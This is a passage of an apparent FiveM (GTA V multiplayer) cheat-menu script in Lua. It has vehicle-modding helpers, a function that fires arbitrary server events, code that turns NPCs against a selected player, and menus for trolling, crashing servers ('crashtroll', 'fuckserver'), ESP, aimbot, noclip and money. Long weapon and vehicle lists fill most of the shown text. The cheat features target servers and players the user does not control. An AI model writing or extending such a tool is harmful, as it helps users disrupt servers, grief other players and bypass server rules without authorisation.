            modWindows = GetVehicleMod(vehicle, 46),
            modLivery = GetVehicleLivery(vehicle)
        }
    end

    FiveM.SetVehicleProperties = function(vehicle, props)
        SetVehicleModKit(vehicle, 0)

        if props.plate ~= nil then SetVehicleNumberPlateText(vehicle, props.plate) end

        if props.plateIndex ~= nil then SetVehicleNumberPlateTextIndex(vehicle, props.plateIndex) end

        if props.health ~= nil then SetEntityHealth(vehicle, props.health) end

        if props.dirtLevel ~= nil then SetVehicleDirtLevel(vehicle, props.dirtLevel) end

        if props.color1 ~= nil then
            local color1, color2 = GetVehicleColours(vehicle)
            SetVehicleColours(vehicle, props.color1, color2)
        end

        if props.color2 ~= nil then
            local color1, color2 = GetVehicleColours(vehicle)
            SetVehicleColours(vehicle, color1, props.color2)
        end

        if props.pearlescentColor ~= nil then
            local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
            SetVehicleExtraColours(vehicle, props.pearlescentColor, wheelColor)
        end

        if props.wheelColor ~= nil then
            local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
            SetVehicleExtraColours(vehicle, pearlescentColor, props.wheelColor)
        end

        if props.wheels ~= nil then SetVehicleWheelType(vehicle, props.wheels) end

        if props.windowTint ~= nil then SetVehicleWindowTint(vehicle, props.windowTint) end

        if props.neonEnabled ~= nil then
            SetVehicleNeonLightEnabled(vehicle, 0, props.neonEnabled[1])
            SetVehicleNeonLightEnabled(vehicle, 1, props.neonEnabled[2])
            SetVehicleNeonLightEnabled(vehicle, 2, props.neonEnabled[3])
            SetVehicleNeonLightEnabled(vehicle, 3, props.neonEnabled[4])
        end

        if props.extras ~= nil then
            for id, enabled in pairs(props.extras) do
                if enabled then
                    SetVehicleExtra(vehicle, tonumber(id), 0)
                else
                    SetVehicleExtra(vehicle, tonumber(id), 1)
                end
            end
        end

        if props.neonColor ~= nil then SetVehicleNeonLightsColour(vehicle, props.neonColor[1], props.neonColor[2], props.neonColor[3]) end

        if props.modSmokeEnabled ~= nil then ToggleVehicleMod(vehicle, 20, true) end

        if props.tyreSmokeColor ~= nil then
            SetVehicleTyreSmokeColor(vehicle, props.tyreSmokeColor[1], props.tyreSmokeColor[2], props.tyreSmokeColor[3])
        end

        if props.modSpoilers ~= nil then SetVehicleMod(vehicle, 0, props.modSpoilers, false) end

        if props.modFrontBumper ~= nil then SetVehicleMod(vehicle, 1, props.modFrontBumper, false) end

        if props.modRearBumper ~= nil then SetVehicleMod(vehicle, 2, props.modRearBumper, false) end

        if props.modSideSkirt ~= nil then SetVehicleMod(vehicle, 3, props.modSideSkirt, false) end

        if props.modExhaust ~= nil then SetVehicleMod(vehicle, 4, props.modExhaust, false) end

        if props.modFrame ~= nil then SetVehicleMod(vehicle, 5, props.modFrame, false) end

        if props.modGrille ~= nil then SetVehicleMod(vehicle, 6, props.modGrille, false) end

        if props.modHood ~= nil then SetVehicleMod(vehicle, 7, props.modHood, false) end

        if props.modFender ~= nil then SetVehicleMod(vehicle, 8, props.modFender, false) end

        if props.modRightFender ~= nil then SetVehicleMod(vehicle, 9, props.modRightFender, false) end

        if props.modRoof ~= nil then SetVehicleMod(vehicle, 10, props.modRoof, false) end

        if props.modEngine ~= nil then SetVehicleMod(vehicle, 11, props.modEngine, false) end

        if props.modBrakes ~= nil then SetVehicleMod(vehicle, 12, props.modBrakes, false) end

        if props.modTransmission ~= nil then SetVehicleMod(vehicle, 13, props.modTransmission, false) end

        if props.modHorns ~= nil then SetVehicleMod(vehicle, 14, props.modHorns, false) end

        if props.modSuspension ~= nil then SetVehicleMod(vehicle, 15, props.modSuspension, false) end

        if props.modArmor ~= nil then SetVehicleMod(vehicle, 16, props.modArmor, false) end

        if props.modTurbo ~= nil then ToggleVehicleMod(vehicle, 18, props.modTurbo) end

        if props.modXenon ~= nil then ToggleVehicleMod(vehicle, 22, props.modXenon) end

        if props.modFrontWheels ~= nil then SetVehicleMod(vehicle, 23, props.modFrontWheels, false) end

        if props.modBackWheels ~= nil then SetVehicleMod(vehicle, 24, props.modBackWheels, false) end

        if props.modPlateHolder ~= nil then SetVehicleMod(vehicle, 25, props.modPlateHolder, false) end

        if props.modVanityPlate ~= nil then SetVehicleMod(vehicle, 26, props.modVanityPlate, false) end

        if props.modTrimA ~= nil then SetVehicleMod(vehicle, 27, props.modTrimA, false) end

        if props.modOrnaments ~= nil then SetVehicleMod(vehicle, 28, props.modOrnaments, false) end

        if props.modDashboard ~= nil then SetVehicleMod(vehicle, 29, props.modDashboard, false) end

        if props.modDial ~= nil then SetVehicleMod(vehicle, 30, props.modDial, false) end

        if props.modDoorSpeaker ~= nil then SetVehicleMod(vehicle, 31, props.modDoorSpeaker, false) end

        if props.modSeats ~= nil then SetVehicleMod(vehicle, 32, props.modSeats, false) end

        if props.modSteeringWheel ~= nil then SetVehicleMod(vehicle, 33, props.modSteeringWheel, false) end

        if props.modShifterLeavers ~= nil then SetVehicleMod(vehicle, 34, props.modShifterLeavers, false) end

        if props.modAPlate ~= nil then SetVehicleMod(vehicle, 35, props.modAPlate, false) end

        if props.modSpeakers ~= nil then SetVehicleMod(vehicle, 36, props.modSpeakers, false) end

        if props.modTrunk ~= nil then SetVehicleMod(vehicle, 37, props.modTrunk, false) end

        if props.modHydrolic ~= nil then SetVehicleMod(vehicle, 38, props.modHydrolic, false) end

        if props.modEngineBlock ~= nil then SetVehicleMod(vehicle, 39, props.modEngineBlock, false) end

        if props.modAirFilter ~= nil then SetVehicleMod(vehicle, 40, props.modAirFilter, false) end

        if props.modStruts ~= nil then SetVehicleMod(vehicle, 41, props.modStruts, false) end

        if props.modArchCover ~= nil then SetVehicleMod(vehicle, 42, props.modArchCover, false) end

        if props.modAerials ~= nil then SetVehicleMod(vehicle, 43, props.modAerials, false) end

        if props.modTrimB ~= nil then SetVehicleMod(vehicle, 44, props.modTrimB, false) end

        if props.modTank ~= nil then SetVehicleMod(vehicle, 45, props.modTank, false) end

        if props.modWindows ~= nil then SetVehicleMod(vehicle, 46, props.modWindows, false) end

        if props.modLivery ~= nil then
            SetVehicleMod(vehicle, 48, props.modLivery, false)
            SetVehicleLivery(vehicle, props.modLivery)
        end
    end

    FiveM.DeleteVehicle = function(vehicle)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
    end

    FiveM.DirtyVehicle = function(vehicle) SetVehicleDirtLevel(vehicle, 15.0) end

    FiveM.CleanVehicle = function(vehicle) SetVehicleDirtLevel(vehicle, 1.0) end

    FiveM.GetPlayers = function()
        local players    = {}
        for i=0, 255, 1 do
            local ped = GetPlayerPed(i)
            if DoesEntityExist(ped) then
                table.insert(players, i)
            end
        end
        return players
    end

    FiveM.GetClosestPlayer = function(coords)
        local players         = FiveM.GetPlayers()
        local closestDistance = -1
        local closestPlayer   = -1
        local usePlayerPed    = false
        local playerPed       = PlayerPedId()
        local playerId        = PlayerId()

        if coords == nil then
            usePlayerPed = true
            coords       = GetEntityCoords(playerPed)
        end

        for i=1, #players, 1 do
            local target = GetPlayerPed(players[i])

            if not usePlayerPed or (usePlayerPed and players[i] ~= playerId) then
                local targetCoords = GetEntityCoords(target)
                local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)

                if closestDistance == -1 or closestDistance > distance then
                    closestPlayer   = players[i]
                    closestDistance = distance
                end
            end
        end

        return closestPlayer, closestDistance
    end

    FiveM.GetWaypoint = function()
        local g_Waypoint = nil;
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
            local blipIterator = GetBlipInfoIdIterator(8)
            local blip = GetFirstBlipInfoId(8, blipIterator)
            g_Waypoint = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector());
        end
        print(g_Waypoint);
        return g_Waypoint;
    end

    FiveM.GetSafePlayerName = function(name)
        if string.IsNullOrEmpty(name) then return "" end;
        return name:gsub("%^", "\\^"):gsub("%~", "\\~"):gsub("%<", "«"):gsub("%>", "»");
    end

    FiveM.SetResourceLocked = function(resource, item)
        Citizen.CreateThread(function()
            if item ~= nil then local item_type, item_subtype = item(); end

            if GetResourceState(resource) == "started" then
                if item ~= nil then item:Enabled(true); end;
                if item_subtype == "UIMenuItem" then item:SetRightBadge(BadgeStyle.None); end;
            else
                if item ~= nil then item:Enabled(false); end;
                if item_subtype == "UIMenuItem" then item:SetRightBadge(BadgeStyle.Lock); end;
            end
        end)
    end

    FiveM.TriggerCustomEvent = function(server, event, ...)
        local payload = msgpack.pack({...})
        if server then
            TriggerServerEventInternal(event, payload, payload:len())
        else
            TriggerEventInternal(event, payload, payload:len())
        end
    end
end

local function RequestNetworkControl(Request)
    local hasControl = false
    while hasControl == false do
        hasControl = NetworkRequestControlOfEntity(Request)
        if hasControl == true or hasControl == 1 then
            break
        end
        if
            NetworkHasControlOfEntity(ped) == true and hasControl == true or
                NetworkHasControlOfEntity(ped) == true and hasControl == 1
         then
            return true
        else
            return false
        end
    end
end

local function makePedHostile(target, ped, swat, clone)
    if swat == 1 or swat == true then
        RequestNetworkControl(ped)
        TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
        SetPedCanSwitchWeapon(ped, true)
    else
        if clone == 1 or clone == true then
            local Hash = GetEntityModel(ped)
            if DoesEntityExist(ped) then
                DeletePed(ped)
                RequestModel(Hash)
                local coords = GetEntityCoords(GetPlayerPed(target), true)
                if HasModelLoaded(Hash) then
                    local newPed = CreatePed(21, Hash, coords.x, coords.y, coords.z, 0, 1, 0)
                    if GetEntityHealth(newPed) == GetEntityMaxHealth(newPed) then
                        SetModelAsNoLongerNeeded(Hash)
                        RequestNetworkControl(newPed)
                        TaskCombatPed(newPed, GetPlayerPed(target), 0, 16)
                        SetPedCanSwitchWeapon(ped, true)
                    end
                end
            end
        else
            local TargetHandle = GetPlayerPed(target)
            RequestNetworkControl(ped)
            TaskCombatPed(ped, TargetHandle, 0, 16)
        end
    end
end

local ojtgh = "50.0"

menulist = {
        
       
        'skid',
        'player',
        'self',
        'weapon',
        'vehicle',
        'world',
        'misc',
        'teleport',
        'lua',
        
        
        'allplayer',
        'playeroptions',
		'troll',
		'jobsplayers',
		"crashtroll",
		
        
      
        'appearance',
        'modifyskintextures',
          'modifyhead',
        'modifiers',
		'skinsmodels',
		
        'weaponspawnerplayer',
        'weaponspawner',
		'WeaponCustomization',
		
        
       
        'melee',
        'pistol',
        'shotgun',
        'smg',
        'assault',
        'sniper',
        'thrown',
        'heavy',
        
      
        'vehiclespawner',
        'vehiclemods',
        'vehiclemenu',
		"VehBoostMenu",
        
        'vehiclecolors',
        'vehiclecolors_primary',
        'vehiclecolors_secondary',
        'primary_classic',
        'primary_matte',
        'primary_metal',
        'secondary_classic',
        'secondary_matte',
        'secondary_metal',
        
        'vehicletuning',
        
       
        'compacts',
        'sedans',
        'suvs',
        'coupes',
        'muscle',
        'sportsclassics',
        'sports',
        'super',
        'motorcycles',
        'offroad',
        'industrial',
        'utility',
        'vans',
        'cycles',
        'boats',
        'helicopters',
        'planes',
        'service',
        'commercial',
        
        
        'fuckserver',
        'objectspawner',
        'objectlist',
        'weather',
        'time',
        
      
		'esp',
		'webradio',
        'credits',
        
      
        'saveload',
        'pois',
        
      
        'esx',
        'vrp',
        'other',
		'money',
		'player1',
		'drogas',
		'mecanico',

}



faceItemsList = {}
faceTexturesList = {}
hairItemsList = {}
hairTextureList = {}
maskItemsList = {}
hatItemsList = {}
hatTexturesList = {}


NoclipSpeedOps = {1, 5, 10, 20, 30}

NoclipSpeed = 1
oldSpeed = nil


ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}

ForcefieldRadius = 5.0


FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}

FastRunMultiplier = 1.0
FastSwimMultiplier = 1.0


RotationOps = {0, 45, 90, 135, 180}

ObjRotation = 90


GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}

GravAmount = 9.8


SpeedModOps = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0, 500.0, 1000.0}
SpeedModAmt = 1.0


ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0,10000.0}
EspDistance = 500.0


ESPRefreshOps = {"0ms", "100ms", "250ms", "500ms", "1s", "2s", "5s"}
ESPRefreshTime = 0


AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
AimbotBone = "SKEL_HEAD"


ClothingSlots = {1, 2, 3, 4, 5}


PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}

PedAttackType = 1


RadiosList = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}
RadiosListWords = {
    "Los Santos Rock Radio",
    "Non-Stop-Pop FM",
    "Radio Los Santos",
    "Channel X",
    "West Coast Talk Radio",
    "Rebel Radio",
    "Soulwax FM",
    "East Los FM",
    "West Coast Classics",
    "Blue Ark",
    "Worldwide FM",
    "FlyLo FM",
    "The Lowdown 91.1",
    "The Lab",
    "Radio Mirror Park",
    "Space 103.2",
    "Vinewood Boulevard Radio",
    "Blonded Los Santos 97.8 FM",
    "Blaine County Radio",
	
}


WeathersList = { 
    "CLEAR",
    "EXTRASUNNY",
    "CLOUDS",
    "OVERCAST",
    "RAIN",
    "CLEARING",
    "THUNDER",
    "SMOG",
    "FOGGY",
    "XMAS",
    "SNOWLIGHT",
    "BLIZZARD"
}

objs_tospawn = {
    "stt_prop_stunt_track_start",
    "prop_container_01a",
    "prop_contnr_pile_01a",
    "ce_xr_ctr2",
    "stt_prop_ramp_jump_xxl",
    "hei_prop_carrier_jet",
    "prop_parking_hut_2",
    "csx_seabed_rock3_",
    "db_apart_03_",
    "db_apart_09_",
    "stt_prop_stunt_tube_l",
    "stt_prop_stunt_track_dwuturn",
    "xs_prop_hamburgher_wl",
    "sr_prop_spec_tube_xxs_01a",
	"prop_air_bigradar",
	"p_tram_crash_s",
	"prop_windmill_01",
	"prop_start_gate_01",
	"prop_trailer_01_new",
	"sr_prop_sr_track_block_01",
	"sr_prop_spec_tube_xxs_04a",
	"stt_prop_stunt_soccer_sball",
	"stt_prop_stunt_track_cutout",
	"stt_prop_stunt_target_small",
	"prop_cj_big_boat",
}


local allweapons = {
    "WEAPON_UNARMED",
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    

    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL",
    

    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_RAYPISTOL",
    

    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_RAYCARBINE",
    

    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    

    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    

    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    

    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_RAYMINIGUN",
}

local meleeweapons = {
    {"WEAPON_KNIFE", "Knife"},
    {"WEAPON_KNUCKLE", "Brass Knuckles"},
    {"WEAPON_NIGHTSTICK", "Nightstick"},
    {"WEAPON_HAMMER", "Hammer"},
    {"WEAPON_BAT", "Baseball Bat"},
    {"WEAPON_GOLFCLUB", "Golf Club"},
    {"WEAPON_CROWBAR", "Crowbar"},
    {"WEAPON_BOTTLE", "Bottle"},
    {"WEAPON_DAGGER", "Dagger"},
    {"WEAPON_HATCHET", "Hatchet"},
    {"WEAPON_MACHETE", "Machete"},
    {"WEAPON_FLASHLIGHT", "Flashlight"},
    {"WEAPON_SWITCHBLADE", "Switchblade"},
    {"WEAPON_POOLCUE", "Pool Cue"},
    {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
}

local thrownweapons = {
    {"WEAPON_GRENADE", "Grenade"},
    {"WEAPON_STICKYBOMB", "Sticky Bomb"},
    {"WEAPON_PROXMINE", "Proximity Mine"},
    {"WEAPON_BZGAS", "BZ Gas"},
    {"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
    {"WEAPON_MOLOTOV", "Molotov"},
    {"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
    {"WEAPON_PETROLCAN", "Fuel Can"},
    {"WEAPON_SNOWBALL", "Snowball"},
    {"WEAPON_FLARE", "Flare"},
    {"WEAPON_BALL", "Baseball"}
}

local pistolweapons = {
    {"WEAPON_PISTOL", "Pistol"},
    {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
    {"WEAPON_COMBATPISTOL", "Combat Pistol"},
    {"WEAPON_APPISTOL", "AP Pistol"},
    {"WEAPON_REVOLVER", "Revolver"},
    {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
    {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
    {"WEAPON_PISTOL50", "Pistol .50"},
    {"WEAPON_SNSPISTOL", "SNS Pistol"},
    {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
    {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
    {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
    {"WEAPON_STUNGUN", "Tazer"},
    {"WEAPON_FLAREGUN", "Flaregun"},
    {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
}

local smgweapons = {
    {"WEAPON_MICROSMG", "Micro SMG"},
    {"WEAPON_MINISMG", "Mini SMG"},
    {"WEAPON_SMG", "SMG"},
    {"WEAPON_SMG_MK2", "SMG Mk II"},
    {"WEAPON_ASSAULTSMG", "Assault SMG"},
    {"WEAPON_COMBATPDW", "Combat PDW"},
    {"WEAPON_GUSENBERG", "Gunsenberg"},
    {"WEAPON_MACHINEPISTOL", "Machine Pistol"},
    {"WEAPON_MG", "MG"},
    {"WEAPON_COMBATMG", "Combat MG"},
    {"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
    {"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
}

local assaultweapons = {
    {"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
    {"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
    {"WEAPON_CARBINERIFLE", "Carbine Rifle"},
    {"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
    {"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
    {"WEAPON_SPECIALCARBINE", "Special Carbine"},
    {"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
    {"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
    {"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
    {"WEAPON_COMPACTRIFLE", "Compact Rifle"}
}

local shotgunweapons = {
    {"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
    {"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
    {"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
    {"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
    {"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
    {"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
    {"WEAPON_MUSKET", "Musket"},
    {"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
    {"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
}

local sniperweapons = {
    {"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
    {"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
    {"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
    {"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
    {"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
}

local heavyweapons = {
    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
    {"WEAPON_RPG", "RPG"},
    {"WEAPON_MINIGUN", "Minigun"},
    {"WEAPON_FIREWORK", "Firework Launcher"},
    {"WEAPON_RAILGUN", "Railgun"},
    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
    {"WEAPON_RAYMINIGUN", "Widowmaker"}
}

local compacts = {
    "BLISTA",
    "BRIOSO",
    "DILETTANTE",
    "DILETTANTE2",
    "ISSI2",
    "ISSI3",
    "ISSI4",
    "ISSI5",
    "ISSI6",
    "PANTO",
    "PRAIRIE",
    "RHAPSODY"
}

local sedans = {
    "ASEA",
    "ASEA2",
    "ASTEROPE",
    "COG55",
    "COG552",
    "COGNOSCENTI",
    "COGNOSCENTI2",
    "EMPEROR",
    "EMPEROR2",
    "EMPEROR3",
    "FUGITIVE",
    "GLENDALE",
    "INGOT",
    "INTRUDER",
    "LIMO2",
    "PREMIER",
    "PRIMO",
    "PRIMO2",
    "REGINA",
    "ROMERO",
    "SCHAFTER2",
    "SCHAFTER5",
    "SCHAFTER6",
    "STAFFORD",
    "STANIER",
    "STRATUM",
    "STRETCH",
    "SUPERD",
    "SURGE",
    "TAILGATER",
    "WARRENER",
    "WASHINGTON"
}

local suvs = {
    "BALLER",
    "BALLER2",
    "BALLER3",
    "BALLER4",
    "BALLER5",
    "BALLER6",
    "BJXL",
    "CAVALCADE",
    "CAVALCADE2",
    "CONTENDER",
    "DUBSTA",
    "DUBSTA2",
    "FQ2",
    "GRANGER",
    "GRESLEY",
    "HABANERO",
    "HUNTLEY",
    "LANDSTALKER",
    "MESA",
    "MESA2",
    "PATRIOT",
    "PATRIOT2",
    "RADI",
    "ROCOTO",
    "SEMINOLE",
    "SERRANO",
    "TOROS",
    "XLS",
    "XLS2"
}

local coupes = {
    "COGCABRIO",
    "EXEMPLAR",
    "F620",
    "FELON",
    "FELON2",
    "JACKAL",
    "ORACLE",
    "ORACLE2",
    "SENTINEL",
    "SENTINEL2",
    "WINDSOR",
    "WINDSOR2",
    "ZION",
    "ZION2"
}

local muscle = {
    "BLADE",
    "BUCCANEER",
    "BUCCANEER2",
    "CHINO",
    "CHINO2",
    "CLIQUE",
    "COQUETTE3",
    "DEVIANT",
    "DOMINATOR",
    "DOMINATOR2",
    "DOMINATOR3",
    "DOMINATOR4",
    "DOMINATOR5",
    "DOMINATOR6",
    "DUKES",
    "DUKES2",
    "ELLIE",
    "FACTION",
    "FACTION2",
    "FACTION3",
    "GAUNTLET",
    "GAUNTLET2",
    "HERMES",
    "HOTKNIFE",
    "HUSTLER",
    "IMPALER",
    "IMPALER2",
    "IMPALER3",
    "IMPALER4",
    "IMPERATOR",
    "IMPERATOR2",
    "IMPERATOR3",
    "LURCHER",
    "MOONBEAM",
    "MOONBEAM2",
    "NIGHTSHADE",
    "PHOENIX",
    "PICADOR",
    "RATLOADER",
    "RATLOADER2",
    "RUINER",
    "RUINER2",
    "RUINER3",
    "SABREGT",
    "SABREGT2",
    "SLAMVAN",
    "SLAMVAN2",
    "SLAMVAN3",
    "SLAMVAN4",
    "SLAMVAN5",
    "SLAMVAN6",
    "STALION",
    "STALION2",
    "TAMPA",
    "TAMPA3",
    "TULIP",
    "VAMOS",
    "VIGERO",
    "VIRGO",
    "VIRGO2",
    "VIRGO3",
    "VOODOO",
    "VOODOO2",
    "YOSEMITE"
}

local sportsclassics = {
    "ARDENT",
    "BTYPE",
    "BTYPE2",
    "BTYPE3",
    "CASCO",
    "CHEBUREK",
    "CHEETAH2",
    "COQUETTE2",
    "DELUXO",
    "FAGALOA",
    "FELTZER3",
    "GT500",
    "INFERNUS2",
    "JB700",
    "JESTER3",
    "MAMBA",
    "MANANA",
    "MICHELLI",
    "MONROE",
    "PEYOTE",
    "PIGALLE",
    "RAPIDGT3",
    "RETINUE",
    "SAVESTRA",
    "STINGER",
    "STINGERGT",
    "STROMBERG",
    "SWINGER",
    "TORERO",
    "TORNADO",
    "TORNADO2",
    "TORNADO3",
    "TORNADO4",
    "TORNADO5",
    "TORNADO6",
    "TURISMO2",
    "VISERIS",
    "Z190",
    "ZTYPE"
}

local sports = {
    "ALPHA",
    "BANSHEE",
    "BESTIAGTS",
    "BLISTA2",
    "BLISTA3",
    "BUFFALO",
    "BUFFALO2",
    "BUFFALO3",
    "CARBONIZZARE",
    "COMET2",
    "COMET3",
    "COMET4",
    "COMET5",
    "COQUETTE",
    "ELEGY",
    "ELEGY2",
    "FELTZER2",
    "FLASHGT",
    "FUROREGT",
    "FUSILADE",
    "FUTO",
    "GB200",
    "HOTRING",
    "ITALIGTO",
    "JESTER",
    "JESTER2",
    "KHAMELION",
    "KURUMA",
    "KURUMA2",
    "LYNX",
    "MASSACRO",
    "MASSACRO2",
    "NEON",
    "NINEF",
    "NINEF2",
    "OMNIS",
    "PARIAH",
    "PENUMBRA",
    "RAIDEN",
    "RAPIDGT",
    "RAPIDGT2",
    "RAPTOR",
    "REVOLTER",
    "RUSTON",
    "SCHAFTER2",
    "SCHAFTER3",
    "SCHAFTER4",
    "SCHAFTER5",
    "SCHLAGEN",
    "SCHWARZER",
    "SENTINEL3",
    "SEVEN70",
    "SPECTER",
    "SPECTER2",
    "SULTAN",
    "SURANO",
    "TAMPA2",
    "TROPOS",
    "VERLIERER2",
    "ZR380",
    "ZR3802",
    "ZR3803"
}

local super = {
    "ADDER",
    "AUTARCH",
    "BANSHEE2",
    "BULLET",
    "CHEETAH",
    "CYCLONE",
    "DEVESTE",
    "ENTITYXF",
    "ENTITY2",
    "FMJ",
    "GP1",
    "INFERNUS",
    "ITALIGTB",
    "ITALIGTB2",
    "LE7B",
    "NERO",
    "NERO2",
    "OSIRIS",
    "PENETRATOR",
    "PFISTER811",
    "PROTOTIPO",
    "REAPER",
    "SC1",
    "SCRAMJET",
    "SHEAVA",
    "SULTANRS",
    "T20",
    "TAIPAN",
    "TEMPESTA",
    "TEZERACT",
    "TURISMOR",
    "TYRANT",
    "TYRUS",
    "VACCA",
    "VAGNER",
    "VIGILANTE",
    "VISIONE",
    "VOLTIC",
    "VOLTIC2",
    "XA21",
    "ZENTORNO"
}

local motorcycles = {
    "AKUMA",
    "AVARUS",
    "BAGGER",
    "BATI",
    "BATI2",
    "BF400",
    "CARBONRS",
    "CHIMERA",
    "CLIFFHANGER",
    "DAEMON",
    "DAEMON2",
    "DEFILER",
    "DEATHBIKE",
    "DEATHBIKE2",
    "DEATHBIKE3",
    "DIABLOUS",
    "DIABLOUS2",
    "DOUBLE",
    "ENDURO",
    "ESSKEY",
    "FAGGIO",
    "FAGGIO2",
    "FAGGIO3",
    "FCR",
    "FCR2",
    "GARGOYLE",
    "HAKUCHOU",
    "HAKUCHOU2",
    "HEXER",
    "INNOVATION",
    "LECTRO",
    "MANCHEZ",
    "NEMESIS",
    "NIGHTBLADE",
    "OPPRESSOR",
    "OPPRESSOR2",
    "PCJ",
    "RATBIKE",
    "RUFFIAN",
